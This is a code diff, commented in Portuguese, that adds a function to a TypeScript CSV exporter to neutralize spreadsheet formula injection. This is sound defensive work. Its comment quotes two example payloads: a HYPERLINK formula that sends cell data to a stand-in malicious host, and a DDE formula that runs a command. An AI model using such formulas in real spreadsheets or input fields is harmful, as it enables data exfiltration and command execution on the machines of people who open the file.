@@ -31,6 +31,22 @@ function needsQuotes(value: string, separator: string): boolean {
   return value.includes(separator) || value.includes('"') || /[\n\r]/.test(value);
 }
 
+/**
+ * Neutraliza fórmula de planilha (CSV injection).
+ *
+ * Uma descrição como `=HYPERLINK("http://malicioso/?d="&A2,"clique")` ou
+ * `=cmd|'/c calc'!A1` vira **fórmula executada** quando o arquivo abre no Excel,
+ * no LibreOffice ou no Google Sheets — o texto do lançamento é entrada do
+ * usuário, então ele controla esse conteúdo. Prefixar com `'` força a célula a
+ * ser texto e a fórmula aparece literalmente, sem executar.
+ *
+ * Também cobrimos TAB e CR: `=1+1` disfarçado de `\t=1+1` é aceito por alguns
+ * parsers.
+ */
+function neutralizeFormula(value: string): string {
+  return /^[=+\-@\t\r]/.test(value) ? `'${value}` : value;
+}
+
 export function toCsv(rows: ExportRow[], separator = ';'): string {
   const header = [
     'Data',
@@ -58,8 +74,10 @@ export function toCsv(rows: ExportRow[], separator = ';'): string {
     row.paidAt,
   ];
 
-  const escape = (value: string): string =>
-    needsQuotes(value, separator) ? `"${value.replace(/"/g, '""')}"` : value;
+  const escape = (value: string): string => {
+    const safe = neutralizeFormula(value);
+    return needsQuotes(safe, separator) ? `"${safe.replace(/"/g, '""')}"` : safe;
+  };
 
   // `sep=` é uma diretiva do Excel; leitores de CSV a tratam como linha válida
   // e ela é descartada junto com o cabeçalho por quem lê por posição.
